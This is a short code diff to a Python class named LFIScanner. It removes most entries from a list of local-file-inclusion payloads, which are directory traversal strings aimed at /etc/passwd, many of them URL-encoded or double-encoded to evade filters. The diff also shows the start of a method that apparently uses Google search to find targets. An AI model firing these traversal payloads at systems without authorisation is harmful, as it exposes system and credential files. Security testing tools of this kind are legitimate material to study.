@@ -9,19 +9,7 @@ class LFIScanner:
     def __init__(self):
         self.lfi_payloads = ["../../../../../../../../../../../etc/passwd,../../../../../../../../../../../etc/passwd",
                              "/etc/passwd", "/..././..././..././..././..././..././..././..././etc/passwd%00",
-                             "../../../../../../../..//etc/passwd",
-                             "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
-                             "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
-                             "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
-                             "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
-                             "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e"
-                             "//etc/passwd",
-                             "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e"
-                             "%252f%252e%252e%252f%252e%252e%252f/etc/passwd",
-                             "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
-                             "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
-                             "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd",
-                             "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd"]
+                             "../../../../../../../..//etc/passwd"]
 
     def google_lfi(self, num_results: int):
         search_engine = "https://www.google.com/search"
